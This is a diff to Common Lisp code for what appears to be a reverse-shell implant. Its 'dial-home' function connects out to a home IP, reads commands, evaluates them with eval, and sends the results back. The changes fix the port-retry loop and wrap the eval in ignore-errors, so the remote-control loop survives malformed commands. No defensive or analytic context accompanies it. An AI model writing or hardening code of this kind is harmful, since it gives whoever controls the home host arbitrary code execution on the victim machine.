@@ -82,11 +82,8 @@
                         ip port :element-type *element-type*))
         do (format t "[+] Trying to connect to ~a:~a... ~a~%" 
                    ip port socket)
-        
         if socket do (return (values socket port))
-        
-        if (= port end) do (setf port start)
-        
+        if (= port end) do (setf port (1- start))
         do (sleep 1)))
 
 (defun dial-home (home-ip)
@@ -95,16 +92,17 @@
             home-ip port)
     (loop for command = (recv-data socket)
           do (format t "[+] Received: ~a~%" command)
-          if (equal command "(quit)")
+          if (string= command "(quit)")
           do (send-data socket #(111 107))
-          until (equal command "(quit)")
+          until (string= command "(quit)")
           do (format t "[+] Evaluating message from *home*...~%")
-          do (with-input-from-string (s command)
-               (let ((result (eval (read s))))
-                 (format t "[+] Result: \"~a\"~%" result)
-                 (send-data socket 
-                            (trivial-utf-8:string-to-utf-8-bytes
-                             (format nil "~a" result))))))
+          do (ignore-errors
+               (with-input-from-string (s command)
+                 (let ((result (eval (read s))))
+                   (format t "[+] Result: \"~a\"~%" result)
+                   (send-data socket 
+                              (trivial-utf-8:string-to-utf-8-bytes
+                               (format nil "~a" result)))))))
     
     (finish-output (usocket:socket-stream socket))
     (usocket:socket-close socket)))
